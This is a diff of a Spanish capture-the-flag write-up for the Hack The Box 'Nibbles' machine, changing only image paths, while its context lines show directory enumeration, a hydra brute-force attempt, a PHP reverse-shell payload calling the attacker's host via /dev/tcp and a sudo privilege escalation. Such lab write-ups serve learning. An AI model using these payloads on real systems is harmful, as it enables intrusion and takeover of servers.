@@ -81,11 +81,11 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.96
 index.html              [Status: 200, Size: 93, Words: 8, Lines: 17, Duration: 53ms]
 ```
 
-![ffuf sobre la raíz de la web: solo aparece index.html](nibbles-02-ffuf-general.png)
+![ffuf sobre la raíz de la web: solo aparece index.html](capturas/nibbles-02-ffuf-general.png)
 
 `index.html` solo muestra un "Hello world!":
 
-![Página principal: Hello world!](nibbles-01-hello-world.png)
+![Página principal: Hello world!](capturas/nibbles-01-hello-world.png)
 
 Sin embargo, inspeccionando el código fuente aparece un comentario revelador:
 
@@ -119,7 +119,7 @@ update.php              [Status: 200, Size: 1622, Words: 103, Lines: 88, Duratio
 
 `admin.php` es un panel de login:
 
-![Panel de login de Nibbleblog](nibbles-03-login-nibbleblog.png)
+![Panel de login de Nibbleblog](capturas/nibbles-03-login-nibbleblog.png)
 
 ---
 
@@ -133,7 +133,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.96.84 http-post-form "
 
 Los resultados son falsos positivos: Nibbleblog tiene protección anti fuerza bruta que bloquea la IP tras varios intentos fallidos.
 
-![Error de Nibbleblog: "Blacklist protection" tras demasiados intentos fallidos](nibbles-04-blacklist-protection.png)
+![Error de Nibbleblog: "Blacklist protection" tras demasiados intentos fallidos](capturas/nibbles-04-blacklist-protection.png)
 
 ---
 
@@ -145,7 +145,7 @@ Nibbleblog guarda su configuración de usuarios en un XML accesible sin autentic
 http://10.129.96.84/nibbleblog/content/private/users.xml
 ```
 
-![Contenido de users.xml: usuario admin y lista de IPs bloqueadas](nibbles-05-users-xml.png)
+![Contenido de users.xml: usuario admin y lista de IPs bloqueadas](capturas/nibbles-05-users-xml.png)
 
 Confirma el usuario `admin` y el motivo del bloqueo (5 intentos fallidos = blacklist). No hay hashes expuestos en ningún directorio accesible, así que probamos como contraseña el propio nombre de la máquina (`nibbles`) — y es la contraseña correcta del panel de administración.
 
@@ -165,7 +165,7 @@ echo '<?php exec("/bin/bash -c '"'"'bash -i >& /dev/tcp/10.10.16.120/4444 0>&1'"
 
 **Paso 2 — Subir `shell.php`** desde el formulario del plugin y guardar cambios:
 
-![Plugin "My Image" tras la subida: los warnings de PHP confirman que el archivo se procesó](nibbles-06-shell-subida-pwned.png)
+![Plugin "My Image" tras la subida: los warnings de PHP confirman que el archivo se procesó](capturas/nibbles-06-shell-subida-pwned.png)
 
 **Paso 3 — Abrir un listener** (`nc -lvnp 4444`) y disparar el archivo subido:
 
@@ -175,7 +175,7 @@ curl http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php
 
 **Paso 4 — Recibir la shell:**
 
-![nc recibiendo la conexión: shell como el usuario nibbler](nibbles-07-reverse-shell.png)
+![nc recibiendo la conexión: shell como el usuario nibbler](capturas/nibbles-07-reverse-shell.png)
 
 Obtenemos ejecución de comandos como el usuario `nibbler`.
 
@@ -196,7 +196,7 @@ nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la
 -rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
 ```
 
-![Permisos de monitor.sh: escritura abierta para cualquier usuario](nibbles-08-monitor-sh-permisos.png)
+![Permisos de monitor.sh: escritura abierta para cualquier usuario](capturas/nibbles-08-monitor-sh-permisos.png)
 
 Además, `nibbler` puede ejecutar ese script concreto como root sin contraseña (entrada específica en `sudoers`). Al ser editable por cualquiera, sobrescribimos su contenido con una shell:
 
